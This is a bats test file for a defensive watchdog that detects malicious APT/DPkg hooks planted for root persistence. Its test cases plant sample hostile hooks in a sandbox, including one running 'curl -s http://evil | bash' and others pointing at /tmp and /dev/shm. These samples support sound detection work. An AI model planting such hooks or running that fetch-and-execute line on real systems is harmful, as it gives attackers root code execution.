#!/usr/bin/env bats
# L2 bats functional tests for the apt-hooks-watchdog scan script.
#
# APT/DPkg run hook commands AS ROOT around package operations:
#   DPkg::Pre-Invoke / Post-Invoke / Pre-Install-Pkgs,
#   APT::Update::Pre-Invoke / Post-Invoke(-Success)
# A planted hook fires on the next apt update / install — package-transaction
# -triggered root code execution (T1546). The watchdog flags a hook command
# under a writable root or carrying an injection pattern.
#
# Runs the actual scan script with `logger` shadowed on PATH and the apt
# config in a tmp sandbox via SELFDEF_APTHOOK_FILE / _D.
#
# Run with: bats packaging/test/L2-apt-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/apt-hooks-watchdog/systemd/apt-hooks-watchdog.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    APTCONF="${TMP}/apt.conf"
    APTCONFD="${TMP}/apt.conf.d"; mkdir -p "${APTCONFD}"
    HOOK="${APTCONFD}/99hook"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_APTHOOK_PROFILE="${PROFILE:-report}" \
    SELFDEF_APTHOOK_BASELINE="${BASELINE}" \
    SELFDEF_APTHOOK_FILE="${APTCONF_F:-$APTCONF}" \
    SELFDEF_APTHOOK_D="${APTCONFD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no apt config → ok / no_apt_config" {
    APTCONF_F="${TMP}/nonexistent" APTCONFD="${TMP}/nonexistent.d" run_wd
    cap | grep -q '"event":"no_apt_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / apt_hooks_intact" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"apt_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "hook command under a writable root → alert / apt_hooks_suspicious" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd                                   # benign baseline
    printf 'DPkg::Pre-Invoke {"/tmp/evil";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"apt_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "hook command carrying a curl|bash injection → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"curl -s http://evil | bash";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "APT::Update::Pre-Invoke under /dev/shm → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'APT::Update::Pre-Invoke {"/dev/shm/x";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign hook change → warn / apt_hooks_changed" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Post-Invoke {"/usr/bin/sync";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"apt_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin hook command is NOT flagged" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\nAPT::Update::Post-Invoke-Success {"/usr/bin/apt-show-versions -i";};\n' > "${HOOK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "enforce profile exits non-zero on a suspicious hook" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"/tmp/evil";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
